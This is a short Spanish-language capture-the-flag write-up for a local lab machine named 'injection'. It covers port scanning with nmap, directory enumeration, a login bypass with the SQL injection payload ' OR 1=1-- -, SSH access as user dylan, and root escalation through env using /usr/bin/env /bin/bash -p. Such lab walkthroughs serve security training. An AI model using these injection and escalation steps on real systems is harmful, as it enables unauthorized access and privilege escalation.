Esta es una máquina catalogada como muy fácil. Para desplegarla ahí que utilizar el comando:
```
sudo su bash auto_deploy.sh injection.tar
```
Luego escaneamos el objetivo:
```
nmap -p- -sS -sC -sC -Pn --min-rate 5000 172.17.0.2
```
Descubrimos que esta el puerto 22 abierto corriendo el servicio ssh y el puerto 80 corriendo el servicio http. El servicio ssh se encuentra en una versión muy actualizada como para encontrar un exploit así que se opta por ver la ip en nuestro buscador. Lo primero que vemos es una imagen con un kinder sorpresa, al hacer una enumeración de subdominios con gobuster y un directorio de seclists encontramos un subdominio index.php y config.php.
![[1]](injection1.png)
Probando las páginas encontramos una página para introducir usuario y contraseña.
![[2]](injection2.png)
![[3]](injection3.png)
Encontramos una vulnerabilidad que puede ser bypasseada con un Bypass autentication. Al buscar como explotar sqlinjection sal la manera más sencilla:

```
' OR 1=1-- -
```
Lo que cambiaría la sentencia sql de:
```
SELECT * FROM usuarios WHERE usuario = 'usuario' AND contraseña = 'contraseña'; 
```
a :
```
SELECT * FROM usuarios WHERE usuario = '' OR 1=1-- - AND contraseña = 'cualquier cosa';

```
![[4]](injection4.png)
Con  esto nos damos cuenta que el usuario dylan tiene acceso a la máquina ssh con la contraseña.
A tener en cuenta que esto al momento de entrar tuve problemas con fingerprint de ssh. Para solucionarlo use:
```
ssh-keygen -f/root/.ssh/known_hosts -R 172.17.0.2
```
Una vez solucionado este problema podemos entrar con las credenciales.
![[5]](injection5.png)
Sabemos por GTFO bins que podremos ejecutar en el directorio env una bash para quedar como root.Una vez ejecutemos el comando: 
```
which env
```
Para saber donde queda el directorio env de la máquina y luego ejecutaremos:
```
/usr/bin/env /bin/bash -p
```
Con este comando nos encontraremos loggeados como root.
![[6]](injection6.png)
Ya con esto hemos acabado la máquina injection.
